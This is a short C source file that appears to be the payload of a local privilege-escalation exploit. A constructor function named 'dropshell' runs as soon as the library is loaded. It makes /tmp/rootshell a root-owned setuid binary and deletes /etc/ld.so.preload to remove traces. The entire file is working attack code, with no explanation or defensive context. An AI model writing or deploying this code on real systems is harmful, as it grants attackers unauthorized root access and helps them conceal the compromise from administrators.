#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>  // Add this header for chmod

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);  // chmod requires sys/stat.h
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

